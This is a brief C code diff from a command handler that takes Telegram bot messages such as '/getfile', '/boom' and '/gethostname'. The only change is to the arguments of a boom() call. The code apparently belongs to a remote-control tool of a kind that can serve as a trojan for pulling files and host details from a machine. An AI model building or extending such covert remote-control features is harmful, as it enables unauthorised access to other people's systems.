@@ -238,7 +238,7 @@ int changecommand(char *id,char *text,char *pName) {
             telegram_send_msg(id,"/getfile <File>\n");         
         }
         else if(strcmp(text_build,"/boom") == 0){
-            boom(path,pName);           
+            boom(pName);           
         }
         else if(strcmp(text_build,"/gethostname") == 0){
             getHostname(text_build);
